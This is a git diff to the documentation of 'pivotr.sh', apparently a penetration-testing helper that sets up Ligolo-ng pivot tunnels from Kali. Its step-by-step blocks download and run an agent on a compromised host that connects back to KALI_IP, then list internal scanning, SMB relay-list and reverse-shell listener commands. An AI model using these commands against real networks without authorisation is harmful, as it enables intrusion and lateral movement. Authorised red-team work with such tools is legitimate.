@@ -21,8 +21,11 @@ Kali-side pivot setup and reference assistant. Automates Ligolo-ng TUN interface
 ## Quick Reference
 
 ```bash
-# Ligolo single pivot (most common engagement scenario)
+# Ligolo single pivot — foreground interactive console (default, most common)
 ./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
+
+# Ligolo single pivot — background/daemon mode (no interactive console)
+./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve --daemon
 
 # Ligolo double pivot (second internal network)
 ./pivotr.sh ligolo2 --subnet 172.16.1.0/24
@@ -81,11 +84,14 @@ Need to forward ONE specific internal port (not full routing)?
 Creates TUN interface, adds route, starts proxy, optionally serves agent binaries via HTTP.
 
 ```bash
-# Minimal
+# Minimal (foreground, interactive console — default)
 ./pivotr.sh ligolo --subnet 10.10.10.0/24
 
 # With file server (auto-serves agent binaries for transfer)
 ./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
+
+# Background/daemon mode (no interactive console — use WebUI)
+./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve --daemon
 
 # All options (defaults shown; omit any flag to use the default)
 ./pivotr.sh ligolo \
@@ -103,39 +109,59 @@ Creates TUN interface, adds route, starts proxy, optionally serves agent binarie
 2. Finds `ligolo-proxy` binary (checks PATH + `/opt/ligolo-ng`, `$HOME/tools/ligolo-ng`, etc.)
 3. Creates TUN interface via `sudo ip tuntap add user $(whoami) mode tun ligolo`
 4. Adds route: `sudo ip route add <subnet> dev ligolo`
-5. Starts `ligolo-proxy -nobanner -selfcert -laddr 0.0.0.0:11601`
-6. If `--serve`: symlinks agent binaries into CWD, starts `python3 -m http.server`
-7. Prints a fully resolved **NEXT STEPS** box
+5. If `--serve`: symlinks agent binaries, starts `python3 -m http.server` in background
+6. Prints a fully resolved **NEXT STEPS** box
+7. Starts `ligolo-proxy` **in the foreground** — this terminal becomes the Ligolo interactive console
 
-**What the next steps box contains:**
+> [!note] **`--daemon` / `--background` flag**: runs the proxy in the background (no interactive console). Use this only when you need the terminal free. In daemon mode the script prints instructions but you must use the WebUI or re-run without `--daemon` to interact with sessions.
+
+---
+
+### First-hop workflow (foreground, default)
+
+> [!tip] **Recommended: use tmux.** Run `./pivotr.sh ligolo --subnet ... --serve` in one pane. The proxy console lives there. Use a second pane for agent transfer, shell work, and recon.
+
+**Step 1 — start the proxy (this terminal becomes the Ligolo console):**
 ```bash
-# Transfer agent to pivot
+./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
+# Script prints NEXT STEPS box, then proxy starts.
+# ligolo» prompt appears — this terminal is now the Ligolo console.
+```
+
+**Step 2 — transfer the agent (second terminal or tmux pane):**
+```bash
+# On the pivot host, download the agent from the Kali file server:
 # Linux:
 wget http://KALI_IP:80/agent -O /tmp/agent && chmod +x /tmp/agent
-
 # Windows:
 iwr http://KALI_IP:80/agent.exe -O agent.exe
-
-# Run on pivot
-# Linux:   /tmp/agent -connect KALI_IP:11601 -ignore-cert
-# Windows: .\agent.exe -connect KALI_IP:11601 -ignore-cert
-
-# In Ligolo console (when agent connects):
-session                      # select the agent
-ifconfig                     # confirm internal interface
-tunnel_start --tun ligolo    # activate tunnel
-
-# Verify tunnel (from Kali):
-nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>
-
-# Step 5 — enumerate internal network:
-./recon.sh --auto <INTERNAL_HOST_IP>          # full recon on internal target
-./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'         # if domain-joined
-nxc smb <SUBNET>/24 --gen-relay-list /tmp/smb_hosts.txt   # find SMB hosts
-
-# Need reverse shells through this tunnel?
-# → pivotr.sh listener --port 4444
 ```
+
+**Step 3 — run the agent on the pivot host:**
+```bash
+# Linux:
+/tmp/agent -connect KALI_IP:11601 -ignore-cert
+# Windows:
+.\agent.exe -connect KALI_IP:11601 -ignore-cert
+```
+The agent connects back automatically and sits there — it does not exit. The Ligolo console (first terminal) shows the new session appearing.
+
+**Step 4 — activate the tunnel (back in the Ligolo console):**
+```bash
+session                      # select the agent from the list
+ifconfig                     # confirm the internal interface and subnet
+tunnel_start --tun ligolo    # route traffic through the tunnel
+```
+
+**Step 5 — verify and enumerate (second terminal):**
+```bash
+nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>             # confirm routing works
+./recon.sh --auto <INTERNAL_HOST_IP>            # full recon on internal target
+./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'           # if domain-joined
+nxc smb <SUBNET>/24 --gen-relay-list /tmp/smb_hosts.txt   # find SMB hosts
+```
+
+> [!tip] Need reverse shells back through the tunnel? `./pivotr.sh listener --port 4444`
 
 **Agent binary locations searched:**
 - `/usr/share/ligolo-ng-common-binaries/` (apt package `ligolo-ng-common-binaries`)
@@ -385,7 +411,7 @@ Shows: TUN interfaces, routes via ligolo interfaces, running `ligolo-proxy` proc
 
 State is tracked in `$TOOLKIT_ROOT/pivots/state.tsv`. Teardown reads this file to know what it created. TUN and route removal requires `sudo`.
 
-> [!tip] Ctrl+C during `ligolo` or `chisel --start-server` also cleans up background processes automatically via trap handler.
+> [!tip] Ctrl+C during `ligolo` (foreground or daemon) or `chisel --start-server` kills all background processes (file server, daemon proxy) automatically via trap handler.
 
 ---
 
